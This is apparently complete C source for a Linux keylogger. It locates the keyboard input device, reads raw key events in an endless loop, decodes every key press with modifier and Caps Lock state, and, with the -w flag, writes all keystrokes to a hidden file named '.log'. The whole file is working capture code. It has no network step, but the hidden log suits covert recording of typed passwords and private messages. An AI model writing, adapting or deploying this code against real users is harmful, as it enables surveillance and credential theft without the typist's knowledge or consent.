#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define BUFFER_SIZE 256
#define LOG_FILE ".log"

typedef struct {
    const char *normal;
    const char *shifted;
} KeyMap;

const KeyMap key_map[] = {
    [KEY_A] = {"a", "A"},
    [KEY_B] = {"b", "B"},
    [KEY_C] = {"c", "C"},
    [KEY_D] = {"d", "D"},
    [KEY_E] = {"e", "E"},
    [KEY_F] = {"f", "F"},
    [KEY_G] = {"g", "G"},
    [KEY_H] = {"h", "H"},
    [KEY_I] = {"i", "I"},
    [KEY_J] = {"j", "J"},
    [KEY_K] = {"k", "K"},
    [KEY_L] = {"l", "L"},
    [KEY_M] = {"m", "M"},
    [KEY_N] = {"n", "N"},
    [KEY_O] = {"o", "O"},
    [KEY_P] = {"p", "P"},
    [KEY_Q] = {"q", "Q"},
    [KEY_R] = {"r", "R"},
    [KEY_S] = {"s", "S"},
    [KEY_T] = {"t", "T"},
    [KEY_U] = {"u", "U"},
    [KEY_V] = {"v", "V"},
    [KEY_W] = {"w", "W"},
    [KEY_X] = {"x", "X"},
    [KEY_Y] = {"y", "Y"},
    [KEY_Z] = {"z", "Z"},
    [KEY_0] = {"0", ")"},
    [KEY_1] = {"1", "!"},
    [KEY_2] = {"2", "@"},
    [KEY_3] = {"3", "#"},
    [KEY_4] = {"4", "$"},
    [KEY_5] = {"5", "%"},
    [KEY_6] = {"6", "^"},
    [KEY_7] = {"7", "&"},
    [KEY_8] = {"8", "*"},
    [KEY_9] = {"9", "("},
    [KEY_SPACE] = {"Space", "Space"},
    [KEY_ENTER] = {"Enter", "Enter"},
    [KEY_BACKSPACE] = {"Backspace", "Backspace"},
    [KEY_TAB] = {"Tab", "Tab"},
    [KEY_ESC] = {"Esc", "Esc"},
    [KEY_COMMA] = {",", "<"},
    [KEY_DOT] = {".", ">"},
    [KEY_SLASH] = {"/", "?"},
    [KEY_SEMICOLON] = {";", ":"},
    [KEY_APOSTROPHE] = {"'", "\""},
    [KEY_LEFTBRACE] = {"[", "{"},
    [KEY_RIGHTBRACE] = {"]", "}"},
    [KEY_MINUS] = {"-", "_"},
    [KEY_EQUAL] = {"=", "+"},
    [KEY_GRAVE] = {"`", "~"},
    [KEY_BACKSLASH] = {"\\", "|"},
    [KEY_KPASTERISK] = {"*", "*"},
    [KEY_KPPLUS] = {"+", "+"},
    [KEY_KPMINUS] = {"-", "-"},
    [KEY_KPDOT] = {".", "."},
    [KEY_KP0] = {"KP_0", "KP_0"},
    [KEY_KP1] = {"KP_1", "KP_1"},
    [KEY_KP2] = {"KP_2", "KP_2"},
    [KEY_KP3] = {"KP_3", "KP_3"},
    [KEY_KP4] = {"KP_4", "KP_4"},
    [KEY_KP5] = {"KP_5", "KP_5"},
    [KEY_KP6] = {"KP_6", "KP_6"},
    [KEY_KP7] = {"KP_7", "KP_7"},
    [KEY_KP8] = {"KP_8", "KP_8"},
    [KEY_KP9] = {"KP_9", "KP_9"},
    [KEY_UP] = {"Arrow Up", "Arrow Up"},
    [KEY_DOWN] = {"Arrow Down", "Arrow Down"},
    [KEY_LEFT] = {"Arrow Left", "Arrow Left"},
    [KEY_RIGHT] = {"Arrow Right", "Arrow Right"},
    [KEY_CAPSLOCK] = {"CapsLock", "CapsLock"},
};

const char *get_key_name(int key_code, bool shift_pressed, bool capslock_active) {
    if (key_code < sizeof(key_map) / sizeof(key_map[0]) && key_map[key_code].normal != NULL) {
        if (key_code >= KEY_A && key_code <= KEY_Z) {
            if (capslock_active && !shift_pressed) {
                return key_map[key_code].shifted;
            }
            if (!capslock_active && shift_pressed) {
                return key_map[key_code].shifted;
            }
            return key_map[key_code].normal;
        }
        return shift_pressed ? key_map[key_code].shifted : key_map[key_code].normal;
    }
    return "UNKNOWN";
}

char *find_keyboard_device() {
    DIR *dir;
    struct dirent *ent;
    static char keyboard_path[BUFFER_SIZE];

    if ((dir = opendir("/dev/input/by-id")) == NULL) {
        perror("Cannot access /dev/input/by-id");
        return NULL;
    }

    while ((ent = readdir(dir)) != NULL) {
        if (strstr(ent->d_name, "kbd") || strstr(ent->d_name, "keyboard")) {
            snprintf(keyboard_path, sizeof(keyboard_path), "/dev/input/by-id/%s", ent->d_name);
            closedir(dir);
            return keyboard_path;
        }
    }

    closedir(dir);
    return NULL;
}

void log_key(FILE *fp, bool shift_pressed, bool ctrl_pressed, bool meta_pressed, bool alt_pressed, bool log_to_file,
             const char *key_name) {
    if (log_to_file) {
        if (shift_pressed) fprintf(fp, "Shift + ");
        if (ctrl_pressed) fprintf(fp, "Ctrl + ");
        if (meta_pressed) fprintf(fp, "Meta + ");
        if (alt_pressed) fprintf(fp, "Alt + ");
        fprintf(fp, "%s\n", key_name);
        fflush(fp);
    } else {
        if (shift_pressed) printf("Shift + ");
        if (ctrl_pressed) printf("Ctrl + ");
        if (meta_pressed) printf("Meta + ");
        if (alt_pressed) printf("Alt + ");
        printf("%s\n", key_name);
    }
}

int main(int argc, char *argv[]) {
    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false,
         capslock_active = false, log_to_file = false;

    if (argc > 1 && strcmp(argv[1], "-w") == 0) {
        log_to_file = true;
    }

    char *keyboard_path = find_keyboard_device();
    if (!keyboard_path) {
        fprintf(stderr, "No keyboard device found\n");
        return EXIT_FAILURE;
    }

    printf("Using keyboard device: %s\n", keyboard_path);

    FILE *fp = NULL;
    if (log_to_file) {
        fp = fopen(LOG_FILE, "w");
        if (!fp) {
            fprintf(stderr, "Cannot open log file\n");
            return EXIT_FAILURE;
        }
    }

    int fd = open(keyboard_path, O_RDONLY);
    if (fd == -1) {
        fprintf(stderr, "Cannot open keyboard device: %s\n", strerror(errno));
        fclose(fp);
        return EXIT_FAILURE;
    }

    struct input_event event;

    while (true) {
        ssize_t bytes_read = read(fd, &event, sizeof(event));
        if (bytes_read == sizeof(event)) {
            if (event.type == EV_KEY) {
                // Update status modifier keys
                if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                    shift_pressed = event.value;
                } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                    ctrl_pressed = event.value;
                } else if (event.code == KEY_LEFTMETA || event.code == KEY_RIGHTMETA) {
                    meta_pressed = event.value;
                } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                    alt_pressed = event.value;
                }
                // Update Caps Lock status (toggle)
                if (event.code == KEY_CAPSLOCK && event.value == 1) {
                    capslock_active = !capslock_active;
                }
                // Handle key press
                if (event.value == 1) {
                    const char *key_name = get_key_name(event.code, shift_pressed, capslock_active);
                    if (strcmp(key_name, "UNKNOWN") != 0) {
                        log_key(fp, shift_pressed, ctrl_pressed, meta_pressed, alt_pressed, log_to_file, key_name);
                    }
                }
            }
        } else if (bytes_read == -1) {
            fprintf(stderr, "Error reading from keyboard device: %s\n", strerror(errno));
            break;
        }
    }

    close(fd);
    if (fp) fclose(fp);
    return EXIT_SUCCESS;
}
